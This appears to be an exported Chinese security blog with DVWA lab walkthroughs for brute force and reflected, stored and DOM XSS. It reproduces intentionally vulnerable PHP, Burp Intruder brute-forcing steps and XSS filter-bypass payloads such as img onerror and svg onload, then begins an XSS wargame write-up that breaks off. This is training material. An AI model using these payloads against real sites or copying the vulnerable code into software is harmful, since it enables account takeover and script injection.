    <content type="text"><![CDATA[Vulnerability: Brute ForceLow 源代码&lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Get username $user = $_GET[ &apos;username&apos; ]; // Get password $pass = $_GET[ &apos;password&apos; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析正常的登入界面，没有验证码和次数限制，没有任何放爆破机制，且存在SQL注入。 漏洞利用使用Burpsuit爆破1、brupsuit抓包右键发送到Intruder2、Attack type 选 Cluster bombcluster bomb - 每个变量对应一个字典，并且进行交叉式破解，尝试各种组合。适用于用户名+密码的破解 3、对应变量加$4、设置payload 5、结果 Middle源代码&lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } 分析在Low的基础上加了mysql_real_escape_string函数，对特殊符号转义，最后的sleep(2)对防爆破意义不大。 漏洞利用这里使用Burpsuite爆破与Low级别的的方式一样 High源代码&lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。 每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。 同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。 漏洞利用方式一 Burpsuit1、设置Opsitions和 Attack type 2、设置Payload 3、user_token就不是单纯的使用字典了，而是需要从我们的页面中获取，burpsuite正好提供了这个功能，方法如下：找到option-&gt;grep extract,按照下图进行操作 4、结果这里用burpsuit爆破比较慢，不能使用多线程，而且有个随机的Tocken，爆破出来的几率很小，但是如果我们知道用户名胡密码中的任意一个，那么只需要跑一个token和密码（用户名）就很轻松，我们可以用攻击类型pitchfork,很容易就可以爆破出来。 方式二 Python脚本Impossible源代码&lt;?php if( isset( $_POST[ &apos;Login&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Sanitise username input $user = $_POST[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_POST[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &apos;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &apos;failed_login&apos; ] &gt;= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &apos;last_login&apos; ]; $last_login = strtotime( $last_login ); $timeout = strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); $timenow = strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&apos;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; } // Check the database (if username matches the password) $data = $db-&gt;prepare( &apos;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &apos;:password&apos;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar = $row[ &apos;avatar&apos; ]; $failed_login = $row[ &apos;failed_login&apos; ]; $last_login = $row[ &apos;last_login&apos; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &apos;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &apos;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。 同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。]]></content>
      <tags>
        <tag>practice</tag>
        <tag>DVWA</tag>
        <tag>Brute-force</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-XSS]]></title>
    <url>%2F2018%2F07%2F08%2FDVWA-XSS%2F</url>
    <content type="text"><![CDATA[XSS(Cross-Site Script)原理攻击者将恶意代码插入到web页面，若服务器端未进行有效过滤，当用户浏览该页面时，插入的代码就会在用户的浏览器中执行 攻击发生在客户端，攻击目标是最终用户的浏览器 恶意代码通常为：危险的HTML标签、客户端脚本、能执行JS的容器等 存在用户输入点的位置，都可能存在跨站漏洞 分类DOM型：页面本身包含一些DOM对象的操作，如果未对输入的参数进行处理，可通过改变DOM结构形成XSS 反射型：用户输入的数据(html或js代码)经服务端反射回客户端，反射后让浏览器去执行 存储型：恶意的脚本代码存储在服务端(文件或数据库)，正常用户请求时，站点从数据库中读取了相应的非法数据，并展示在当前页面 Vulnerability: Reflected Cross Site Scripting (XSS)Low关键代码Reflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Feedback for end user echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } ?&gt; 分析通过GET提交的参数name在没有任何安全验证（过滤）的情况下直接输出 Payload:&lt;script&gt;alert(/xss/)&lt;/script&gt; 验证成功 利用MediumReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 分析使用函数str_replace函数(该函数区分大小写，而且只替换一次)将参数name中的&lt;script字符串替换为空，这里使用大小写绕过或者嵌套 Payload&lt;Script&gt;alert(/xss/)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; HighReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 分析使用正则表达式将&lt;script顺序出现的大小写或者嵌套形式出现的过滤掉,这里只是script标签，可以使用一些能够执行JavaScript代码的JavaScript事件 Payload&lt;img src=# onerror=alert(&quot;xss&quot;)&gt; 通过加载一个不存在的图片出错出发javascript onerror事件，验证存在XSS ImpossibleReflected XSS Source&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析这里对参数name进行了预定义字符实体化 Vulnerability: Stored Cross Site Scripting (XSS)LowStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 分析前面进行了数据库连接操作，对参数mtxMessage传递的数据只进行了stripslashes()函数（删除反斜杠）处理，对txtname参数的长度为10，然后就将两个参数传递的数据存储到了数据库中 Payload&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 可以看到每次点到这个页面时都会触发 MediumStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 分析关键函数trim() 用于去除字符串两端的空白字符 strip_tags() 剥去字符串中的 HTML、XML 以及 PHP 的标签。 addslashes() 返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串。 htmlspecialchars() 把预定义的字符 &quot;&lt;&quot; （小于）和 &quot;&gt;&quot; （大于）转换为 HTML 实体， 转换为实体常用于防止浏览器将其用作 HTML 元素 str_replace(&apos;&lt;script&gt;&apos;) 以其他字符替换字符串中的一些字符（区分大小写）且只替换一次 首先对传进来的值去除了两端的空白字符，将message变量的值中的预定义字符前添加了反斜杠，并转为了html实体，变量name把&lt;script替换了一次，且不区分大小写,这里要注意在客户端限制了输入的字符数，我们看到两个输入框，但是对name的限制更小，用firebug把输入十个字符的限制在客户端改成100。 Payload&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt; &lt;Script&gt;alert(/xss/)&lt;/script&gt; HighStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 分析对参数message，去除两端的空白字符，对预定义字符转义，并转换为html实体对参数name，使用正则把顺序为&lt;script的字符串的大小写，嵌套都过滤了，这里使用能够执行JavaScript的事件来执行,绕过方法与与前面反射型相似，通过不存在的图片触发 onerror事件执行 Payload&lt;img src=# onerror=&quot;alert(/high xss/)&quot;&gt; ImpossibleStored XSS Source&lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析此处将message和name两个参数全部进行了html实体化，且绑定了变量将sql语句预处理 Vulnerability: DOM Based Cross Site Scripting (XSS)Low在服务端没有代码，客户端的源代码 &lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; 分析在script脚本里，通过document操作后将default后面的参数值直接赋值给了lang，经过url解码后将其值赋给option标签的value属性节点和文本节点直接显示出来， 直接将default后面的参数值改为test后可以看到显示了test Payload&lt;script&gt;alert(/xss-dom/)&lt;/script&gt; Medium&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt; &lt;/form&gt; stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）,这里过滤了&lt;script标签且大小形式了过滤了 Payload方式1url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤 ?#default=&lt;script&gt;alert(/dom-xss-test-medium/)&lt;/script&gt; 方法2或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造链接，要注意闭合 img标签onerror事件加载 document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); &lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;img src=# onerror=&quot;alert(&quot;xss&quot;)&quot;&gt; 同样的标签还有svg，svg的onload事件同样可以在页面加载时执行js代码，产生弹框的效果 &lt;/option&gt;&lt;/select&gt;&lt;option&gt;&lt;svg onload=&quot;alert(&quot;xss&quot;)&quot;&gt; HighVulnerability Source&lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { # White list the allowable languages switch ($_GET[&apos;default&apos;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 分析服务端使用了case语句进行判断，不能再通过其他JavaScript事件来绕过了这里我们使用 # 来跳过服务端检查 Payload#?default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 验证成功 ImpossibleVulnerability Source&lt;?php # Don&apos;t need to do anything, protction handled on the client side ?&gt; 参考通过DVWA学习XSS 绕过DVWA所有安全级别的XSS Payload]]></content>
      <tags>
        <tag>practice</tag>
        <tag>DVWA</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wargame-XSS-game]]></title>
    <url>%2F2018%2F07%2F04%2FWargame-XSS-game%2F</url>
    <content type="text"><![CDATA[Wargame-XSS-gamehttp://www.xssgame.com/ Level 1:Hello,world of XSS提示部分任务描述 此级别演示了跨站点脚本的常见原因，其中用户输入直接包含在页面中而没有正确转义。 与下面的易受攻击的应用程序窗口交互，找到一种方法使其执行您选择的JavaScript。您可以在易受攻击的窗口内执行操作或直接编辑其URL栏。 使命目标 注入脚本以alert()在下面的框架中弹出JavaScript 。 一旦显示警报，您就可以进入下一级别。你的目标 测试在输入框中随便输入 test 后得到 https://xss-game.appspot.com/level1/frame?query=test URL变化 页面重新加载 测试的字符内容被一起加载到页面中 其中URL结尾的?query= 后面的内容与我们输入的是一致的（输入输出相同） payload&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt; 执行成功 https://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt; Level 2:Persistence is key(持久性是关键)时间到了！用户提供的每一项数据都必须正确转义，以显示它所在页面的上下文。这个级别说明了原因。 输入一个输入，使应用程序在JavaScript中执行alert（）函数。 分析关键部分代码&lt;html&gt; &lt;head&gt; &lt;script src=&quot;/static/js/js_frame.js&quot;&gt;&lt;/script&gt; &lt;script&gt; function startTimer(seconds) { seconds = parseInt(seconds) || 3; setTimeout(function() { window.confirm(&quot;Time is up!&quot;); window.loading.style.display = &apos;none&apos;; window.message.innerHTML = &apos;&lt;a href=&quot;?&quot;&gt;Go back&lt;/a&gt; to the timer setup page&apos;; }, seconds * 1000); } &lt;/script&gt; &lt;/head&gt; &lt;body style=&quot;background-color: white;&quot;&gt; &lt;center&gt; &lt;h1 style=&quot;font-family: serif&quot;&gt; webtim&lt;span style=&quot;color: teal&quot;&gt;r&lt;/span&gt; &lt;span style=&quot;color: green&quot;&gt;pro&lt;/span&gt; &lt;/h1&gt; 